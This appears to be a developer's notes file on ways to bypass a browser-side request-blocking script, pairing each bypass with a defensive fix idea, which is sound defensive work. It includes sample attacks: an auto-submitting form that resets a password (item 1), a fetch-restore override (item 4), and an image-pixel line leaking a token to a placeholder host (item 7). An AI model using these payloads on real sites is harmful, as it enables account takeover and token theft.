# POSSIBLE BYPASSES - FIXES WILL BE IMPLEMENTED WITH TIME.


## 1.  Directly using <form> submissions

```html
<form action="/user/12345/password-reset/" method="POST">
  <input type="hidden" name="new_password" value="malicious123">
</form>
<script>document.forms[0].submit()</script>

```

Idea: Override HTMLFormElement.prototype.submit and intercept submit events globally:

```js
const originalSubmit = HTMLFormElement.prototype.submit;
HTMLFormElement.prototype.submit = function() {
    const action = this.action;
    if (!isAllowed(action) || isPasswordEndpoint(action)) {
        logBlockedRequest('form submit', action);
        throw new Error(`Blocked form submission to ${action}`);
    }
    return originalSubmit.apply(this, arguments);
};

document.addEventListener('submit', function(e) {
    const action = e.target.action;
    if (!isAllowed(action) || isPasswordEndpoint(action)) {
        e.preventDefault();
        logBlockedRequest('form submit', action);
    }
}, true);

```


## 2. Using iframe injection with same-origin forms
Idea: Deny iframe usage (troublesome to implement, need to write further logic for webgl & other site elements)

```js
if (window.top !== window.self) {
    console.warn('[Security] Prevented iframe embedding.');
    window.top.location = window.location.href;
}

```


## 3. Blob or Object URLs for code injection
An attacker could generate a malicious Blob or data: URL that executes fetch/XHR after being injected dynamically into the DOM.

Idea: Monitor dangerous element types like <script>, <iframe>, or <a> with suspicious hrefs

```js
new MutationObserver((mutations) => {
    mutations.forEach(m => {
        m.addedNodes.forEach(node => {
            if (node.tagName === 'SCRIPT' && node.src && !isAllowed(node.src)) {
                logBlockedRequest('script injection', node.src);
                node.remove();
            }
        });
    });
}).observe(document.documentElement, { childList: true, subtree: true });

```

## 4. Tampering with binding

```js
window.fetch = realFetch; // override the patch

```

NOT FOOLPROOF IDEA: Freeze or proxy the critical API
```js
Object.defineProperty(window, 'fetch', {
    value: window.fetch,
    writable: false,
    configurable: false
});
```

## 5. Custom transport layers (e.g. beacon, iframe postMessage)
## 6. Using non-standard header names
## 7. Data-exfil via DNS or image pixels
Even without fetch, an attacker can leak data via:
```js
new Image().src = "https://example.com/leak?token=xyz";
```
IDEA:  Patch Image, document.createElement('img'), and possibly setAttribute('src').
